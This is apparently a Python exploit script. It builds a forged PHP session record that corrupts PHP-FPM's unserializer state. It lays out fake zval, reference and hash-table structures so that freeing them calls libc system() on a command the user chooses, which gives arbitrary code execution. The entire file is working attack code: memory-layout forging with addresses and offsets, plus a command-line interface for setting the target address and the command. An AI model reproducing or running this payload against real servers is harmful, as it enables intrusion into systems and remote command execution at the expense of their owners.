#!/usr/bin/env python3
"""Build the forged session record for the FPM orphan chain.

Record layout (php session serializer):
    pad|s:LEN:"<payload>";upload_progress_fk1|R:101;

The payload is placed in the record buffer such that byte offset
--dfile-off lands on the stale decoder address D.  At D the payload holds a
forged php_unserialize_data:

    last            = D + 56          (var_entries inside the same block)
    entries.used_slots = 1018         (forces var_push to allocate a fresh
                                       block, leaving entries.data[] forged)
    entries.data[100] = V             (fake zval: IS_REFERENCE -> R)

R is a forged zend_reference with rc=0 wrapping a fake zend_array at S.
S's pDestructor is libc system(); the upload-progress update replaces the
session key, zval_ptr_dtor()s the reference, and the array destructor calls
system() with arData pointing at the command string.
"""
from __future__ import annotations

import argparse
import struct

IS_REFERENCE_EX = 10 | (1 << 8)          # 0x10a
IS_ARRAY_EX = 7 | (1 << 8)               # 0x107 (refcounted, not collectable)


def q(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<Q", buf, off, val & 0xFFFFFFFFFFFFFFFF)


def d32(buf: bytearray, off: int, val: int) -> None:
    struct.pack_into("<I", buf, off, val & 0xFFFFFFFF)


def build(d: int, system_addr: int, dfile_off: int, cmd: bytes, length: int) -> bytes:
    prefix = b"pad|s:%d:\"" % length
    struct_off = dfile_off - len(prefix)          # payload offset that maps to D
    if struct_off < 0:
        raise SystemExit("dfile-off smaller than prefix")

    payload = bytearray(b"P" * length)
    V = d + 0x2100
    R = d + 0x2180
    S = d + 0x2200
    CMD = d + 0x2300

    # forged php_unserialize_data at D (8216 bytes incl. entries.data[1018])
    st = bytearray(8216)
    q(st, 0, d + 56)              # last = &entries
    q(st, 56, 1018)               # entries.used_slots
    q(st, 64, 0)                  # entries.next
    q(st, 72 + 8 * 100, V)        # entries.data[100] -> fake zval
    payload[struct_off:struct_off + len(st)] = st

    def put(addr: int, data: bytes) -> None:
        off = struct_off + (addr - d)
        if off < 0 or off + len(data) > length:
            raise SystemExit("structure %#x outside payload" % addr)
        payload[off:off + len(data)] = data

    # fake zval at V: IS_REFERENCE -> R
    zv = bytearray(16)
    q(zv, 0, R)
    d32(zv, 8, IS_REFERENCE_EX)
    d32(zv, 12, 0)
    put(V, zv)

    # fake zend_reference at R: rc=0, type=IS_REFERENCE, val = fake array zval
    ref = bytearray(32)
    d32(ref, 0, 0)                # gc.refcount = 0 (ZVAL_COPY makes it 1)
    d32(ref, 4, 10)               # gc.type_info = IS_REFERENCE
    q(ref, 8, S)                  # val.value = fake HashTable
    d32(ref, 16, IS_ARRAY_EX)     # val.type_info = IS_ARRAY (refcounted)
    d32(ref, 20, 0)
    q(ref, 24, 0)                 # sources = 0
    put(R, ref)

    # fake HashTable at S: pDestructor = system, arData = command bytes
    ht = bytearray(0x38)
    d32(ht, 0x00, 1)
    d32(ht, 0x04, 7)              # gc: rc=1, IS_ARRAY
    d32(ht, 0x08, 0x10)           # flags = HASH_FLAG_STATIC_KEYS
    d32(ht, 0x0C, 0xFFFFFFF8)     # nTableMask
    q(ht, 0x10, CMD)              # arData
    d32(ht, 0x18, 1)              # nNumUsed
    d32(ht, 0x1C, 1)              # nNumOfElements
    d32(ht, 0x20, 8)              # nTableSize
    d32(ht, 0x24, 0)
    q(ht, 0x28, 0)                # nNextFreeElement
    q(ht, 0x30, system_addr)      # pDestructor
    put(S, ht)

    put(CMD, cmd + b"\x00")

    tail = b'";' + b"upload_progress_fk1|R:101;"
    return prefix + bytes(payload) + tail


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--d", required=True, type=lambda x: int(x, 0))
    ap.add_argument("--system", required=True, type=lambda x: int(x, 0))
    ap.add_argument("--dfile-off", type=lambda x: int(x, 0), default=0x1FE8)
    ap.add_argument("--cmd", default="id>/tmp/f2s_pwn")
    ap.add_argument("--length", type=int, default=65500)
    ap.add_argument("--out", required=True)
    args = ap.parse_args()

    rec = build(args.d, args.system, args.dfile_off, args.cmd.encode(), args.length)
    with open(args.out, "wb") as fh:
        fh.write(rec)
    print("record: len=%d d=%#x system=%#x dfile=%#x struct_payload_off=%#x V=%#x R=%#x S=%#x CMD=%#x"
          % (len(rec), args.d, args.system, args.dfile_off,
             args.dfile_off - len(b'pad|s:%d:"' % args.length),
             args.d + 0x2100, args.d + 0x2180, args.d + 0x2200, args.d + 0x2300))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
